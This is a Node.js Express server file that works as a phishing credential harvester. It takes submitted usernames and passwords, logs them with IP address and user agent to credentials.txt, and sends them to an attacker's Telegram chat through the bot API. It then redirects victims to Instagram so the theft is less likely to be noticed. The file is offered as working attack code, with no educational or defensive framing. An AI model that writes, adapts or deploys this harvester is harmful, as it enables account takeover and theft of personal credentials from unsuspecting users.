const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

// === CONFIG ===
const TELEGRAM_ENABLED = true;
const BOT_TOKEN = 'YOUR_BOT_TOKEN';
const CHAT_ID = 'YOUR_CHAT_ID';


// === ROUTE ===
app.post('/submit', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.redirect('/?error=1');
    }

    const timestamp = new Date().toISOString();
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    const message = `
Time: ${timestamp}
IP: ${ip}
Username: ${username}
Password: ${password}
User-Agent: ${userAgent}
`;

    // === SAVE TO FILE ===
    const log = `[${timestamp}] IP: ${ip} | Username: ${username} | Password: ${password} | UA: ${userAgent}\n`;

    fs.appendFileSync('credentials.txt', log);

    // === TELEGRAM ===
    if (TELEGRAM_ENABLED) {
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message
            });
        } catch (err) {
            console.log('Telegram error:', err.message);
        }
    }

    // === REDIRECT ===
    res.redirect('https://www.instagram.com/');
});

// === START SERVER ===
app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});